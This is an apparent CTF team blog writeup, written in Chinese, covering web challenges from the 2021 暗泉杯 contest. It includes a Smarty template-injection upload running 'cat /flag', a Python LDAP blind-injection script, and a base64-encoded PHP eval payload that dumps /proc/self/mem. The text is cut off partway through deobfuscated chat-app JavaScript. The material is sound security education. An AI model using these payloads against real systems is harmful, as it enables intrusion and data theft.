<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='* 开头题目表示赛后补题
Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
[萌]odd_upload 题目描述：目录结构与官方项目example相同
所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
flag{1ae85554-c785-4321-8d77-0f68974929f8}
easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&amp;rsquo;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
import requests url = &amp;#34;http://47.'><title>2021暗泉杯 Writeup</title>

<link rel='canonical' href='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='2021暗泉杯 Writeup'>
<meta property='og:description' content='* 开头题目表示赛后补题
Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
[萌]odd_upload 题目描述：目录结构与官方项目example相同
所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
flag{1ae85554-c785-4321-8d77-0f68974929f8}
easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&amp;rsquo;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
import requests url = &amp;#34;http://47.'>
<meta property='og:url' content='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/'>
<meta property='og:site_name' content='or4nge'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='暗泉杯' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Re' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Crypto' /><meta property='article:published_time' content='2021-12-06T19:23:41&#43;08:00'/><meta property='article:modified_time' content='2021-12-06T19:23:41&#43;08:00'/><meta property='og:image' content='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.png' />
<meta name="twitter:title" content="2021暗泉杯 Writeup">
<meta name="twitter:description" content="* 开头题目表示赛后补题
Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
[萌]odd_upload 题目描述：目录结构与官方项目example相同
所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
flag{1ae85554-c785-4321-8d77-0f68974929f8}
easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&amp;rsquo;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
import requests url = &amp;#34;http://47."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams.png' />
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/dnuictf-writeup-by-or4nge/">
                <img src="/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams_hu9bd851d71a6520395d404c81ac536fbe_87588_800x0_resize_box_3.png"
                        srcset="/post/dnuictf-writeup-by-or4nge/Top%2010%20Teams_hu9bd851d71a6520395d404c81ac536fbe_87588_800x0_resize_box_3.png 800w, /post/dnuictf-writeup-by-or4nge/Top%2010%20Teams_hu9bd851d71a6520395d404c81ac536fbe_87588_1600x0_resize_box_3.png 1600w"
                        width="800" 
                        height="296" 
                        loading="lazy"
                        alt="Featured image of post 2021暗泉杯 Writeup" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/dnuictf-writeup-by-or4nge/">2021暗泉杯 Writeup</a>
    </h2>

    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Dec 06, 2021</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    19 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <p><code>*</code> 开头题目表示赛后补题</p>
<h2 id="web">Web</h2>
<h3 id="签到flag">[签到]flag</h3>
<p>等一个一个拼出来，业余web手的笨B做题法</p>
<h3 id="萌odd_upload">[萌]odd_upload</h3>
<p>题目描述：目录结构与官方项目example相同</p>
<p>所以去查看<code>smarty</code>的目录结构，同时上传文件发现过滤了<code>php</code>相关的很多后缀，但<code>.tpl</code>没有过滤，同时可以控制上传的目录，所以向<code>./templates</code>目录上传<code>header.tpl</code>覆盖原有的内容，添加一句：<code>{system('cat /flag')}</code>，之后再重新访问<code>题目链接</code>就能获取flag。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 113; 
			flex-basis: 273px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/odd_upload_flag.png" data-size="1028x902">
		<img src="/post/dnuictf-writeup-by-or4nge/odd_upload_flag.png"
			width="1028"
			height="902"
			srcset="/post/dnuictf-writeup-by-or4nge/odd_upload_flag_hu215009848e3c3cc6a32cead659f9e57f_23593_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/odd_upload_flag_hu215009848e3c3cc6a32cead659f9e57f_23593_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p><code>flag{1ae85554-c785-4321-8d77-0f68974929f8}</code></p>
<h3 id="easyinject">easyinject</h3>
<p>源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示</p>
<p>The flag is a special email address username.It is attribute of one  account and there are multiple accounts in the directory. flag is  composed of a-z0-9_</p>
<p>说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？</p>
<p>按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&rsquo;(&lsquo;或者&rsquo;)&lsquo;就会报错：</p>
<pre tabindex="0"><code>Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48
Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49
</code></pre><p>有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://47.106.172.144:2333/&#34;</span>
</span></span><span style="display:flex;"><span>alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search</span>(flag):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> alphabet:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(flag+c+&#39;*&#39;)</span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;user&#39;</span>:flag<span style="color:#f92672">+</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;pass&#39;</span>:<span style="color:#e6db74">&#39;1&#39;</span>})
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;找不到用户&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;查询用户不唯一&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;密码错误&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(c+&#39;\n&#39;+r.text)</span>
</span></span><span style="display:flex;"><span>            print(flag<span style="color:#f92672">+</span>c)
</span></span><span style="display:flex;"><span>            search(flag<span style="color:#f92672">+</span>c)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;Error: [&#39;</span><span style="color:#f92672">+</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>r<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>search(<span style="color:#e6db74">&#39;&#39;</span>)
</span></span></code></pre></div><h3 id="hideandseek">*hideandseek</h3>
<p>和web没有啥关系，和二进制全是关系。</p>
<p>先附上打本地的DockerFile:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> php:8.1.0</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> ./src /var/www/html<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> ./flag /flag<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html/</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod -R  <span style="color:#ae81ff">0555</span>  /var/www/html/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;php&#34;</span>, <span style="color:#e6db74">&#34;-S&#34;</span>, <span style="color:#e6db74">&#34;0.0.0.0:8000&#34;</span>, <span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;/var/www/html&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>这题上先读flag，然后把flag给覆盖了，你只有一次执行任意代码的机会。</p>
<p>思路上来一下子就指向了<code>/proc</code>，进程目录，我们肯定是能通过分析这个进程把flag拿到了。目前已知的<code>/proc</code>的博客有：</p>
<blockquote>
<p><a class="link" href="https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"  target="_blank" rel="noopener"
    >https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/</a></p>
<p><a class="link" href="https://xz.aliyun.com/t/10579"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/10579</a></p>
</blockquote>
<p>第一反应是读fd，看看文件的符号链接，如果fopen了，但没fclose就有可能在fd里找到，本地一试发现没有。</p>
<p>于是考虑利用别的，比如<code>./exe</code>，是一个ELF文件，但可惜<code>strings ./exe</code>没用，因为flag变量是在运行时读取的，生成elf是不存在这个字符串的，于是就读<code>./mem</code>，<code>/proc/{PID}/mem</code>是可用于访问进程的内存的页面。但是发现读取失败了，报错如下：</p>
<pre tabindex="0"><code>cat mem: Input/output error
</code></pre><p>搜到了解释原因：https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux</p>
<p><code>/proc/$pid/mem</code>显示$pid 内存的内容与进程中的映射方式相同，即伪文件中偏移<em>x</em>处的字节与进程中地址<em>x</em>处的字节相同。如果在进程中未映射地址，则从文件中的相应偏移量读取返回<code>EIO</code>（输入/输出错误）。例如，由于进程中的第一页永远不会被映射（因此取消引用<code>NULL</code>指针会完全失败，而不是无意中访问实际内存），因此读取 的第一个字节<code>/proc/$pid/mem</code>总是会产生 I/O 错误。</p>
<p>同时也拿到了一份用python拿内存信息的脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>maps_file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)
</span></span><span style="display:flex;"><span>mem_file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/self/mem&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>output_file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;self.dump&#34;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> maps_file<span style="color:#f92672">.</span>readlines():  <span style="color:#75715e"># for each mapped region</span>
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])&#39;</span>, line)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>:  <span style="color:#75715e"># if this is a readable region</span>
</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        end <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        mem_file<span style="color:#f92672">.</span>seek(start)  <span style="color:#75715e"># seek to region start</span>
</span></span><span style="display:flex;"><span>        chunk <span style="color:#f92672">=</span> mem_file<span style="color:#f92672">.</span>read(end <span style="color:#f92672">-</span> start)  <span style="color:#75715e"># read region contents</span>
</span></span><span style="display:flex;"><span>        output_file<span style="color:#f92672">.</span>write(chunk)  <span style="color:#75715e"># dump contents to standard output</span>
</span></span><span style="display:flex;"><span>maps_file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>mem_file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>output_file<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p>我盲猜flag就在内存里，但我也不是打二进制的，也不知道在哪，于是就打算把整个chunk全部正则匹配即可。</p>
<p>把上述代码翻译成php，修改部分内容如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$maps_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/self/maps&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>$mem_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/self/mem&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#f92672">!</span> <span style="color:#a6e22e">feof</span>($maps_file)) {
</span></span><span style="display:flex;"><span>    $line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($maps_file);<span style="color:#75715e">//fgets()函数从文件指针中读取一行
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $m <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/&#34;</span>, $line, $match);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($match[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>) {
</span></span><span style="display:flex;"><span>        $start <span style="color:#f92672">=</span> <span style="color:#a6e22e">hexdec</span>($match[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>        $end <span style="color:#f92672">=</span> <span style="color:#a6e22e">hexdec</span>($match[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fseek</span>($mem_file, $start);
</span></span><span style="display:flex;"><span>        $chunk <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($mem_file, $end <span style="color:#f92672">-</span> $start);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag\{.*\}/&#34;</span>, $chunk)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/(flag\{.*\})/&#34;</span>, $chunk, $ans);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">var_dump</span>($ans);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($maps_file);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($mem_file);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>最后用base64+urlencode传参（有了安洵杯的教训，base64一定要编码），最终payload如下：</p>
<pre tabindex="0"><code>http://5b599005-3dfe-44e4-ac13-96fc3b194f3e.nssctf.neusoft.edu.cn/?eval=eval(base64_decode(%22JG1hcHNfZmlsZSA9IGZvcGVuKCIvcHJvYy9zZWxmL21hcHMiLCAiciIpOwokbWVtX2ZpbGUgPSBmb3BlbigiL3Byb2Mvc2VsZi9tZW0iLCAicmIiKTsKd2hpbGUoISBmZW9mKCRtYXBzX2ZpbGUpKSB7CiAgICAgICAgJGxpbmUgPSBmZ2V0cygkbWFwc19maWxlKTsvL2ZnZXRzKCnlh73mlbDku47mlofku7bmjIfpkojkuK3or7vlj5bkuIDooYwKICAgICAgICAgICAgJG0gPSBwcmVnX21hdGNoKCIvKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pLyIsICRsaW5lLCAkbWF0Y2gpOwogICAgICAgICAgICBpZigkbWF0Y2hbM10gPT0gJ3InKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0YXJ0ID0gaGV4ZGVjKCRtYXRjaFsxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRlbmQgPSBoZXhkZWMoJG1hdGNoWzJdKTsKICAgICAgICAgICAgICAgICAgICAgICAgZnNlZWsoJG1lbV9maWxlLCAkc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNodW5rID0gZnJlYWQoJG1lbV9maWxlLCAkZW5kIC0gJHN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9mbGFnXHsuKlx9LyIsICRjaHVuaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goIi8oZmxhZ1x7LipcfSkvIiwgJGNodW5rLCAkYW5zKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyX2R1bXAoJGFucyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KfQpmY2xvc2UoJG1hcHNfZmlsZSk7CmZjbG9zZSgkbWVtX2ZpbGUpOw%3D%3D%22));
</code></pre><h3 id="wschat">*wschat</h3>
<p>前后端交互用的是socket io，参数格式用的是protobuf，前端的js加了很多混淆和反调试。可以在这个网站https://lelinhtinh.github.io/de4js/做个简单的恢复后再看。</p>
<p>贴一下我恢复后的还算是能看的关键代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//cdn.bootcss.com/socket.io/2.1.1/socket.io.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;protobuf.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sock</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#e6db74">&#39;ws://&#39;</span> <span style="color:#f92672">+</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">WSMessage</span>, <span style="color:#a6e22e">wsmessage</span>, <span style="color:#a6e22e">buffer</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">protobuf</span>.<span style="color:#a6e22e">load</span>(<span style="color:#e6db74">&#39;chat.proto&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">_0x75e501</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">err</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">LoginReq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x75e501</span>.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#39;wschat.chat.LoginReq&#39;</span>), <span style="color:#a6e22e">RegReq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x75e501</span>.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#39;wschat.chat.RegReq&#39;</span>), <span style="color:#a6e22e">ServerRsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x75e501</span>.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#39;wschat.chat.ServerRsp&#39;</span>), <span style="color:#a6e22e">MsgReq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x75e501</span>.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#39;wschat.chat.MsgReq&#39;</span>), <span style="color:#a6e22e">LogoutReq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x75e501</span>.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#39;wschat.chat.LogoutReq&#39;</span>);
</span></span><span style="display:flex;"><span>}), window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x1f4215</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">btn1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;btn1&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">btn2</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;btn2&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">btn_send</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;btn_send&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;user&#39;</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pass</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;pass&#39;</span>),
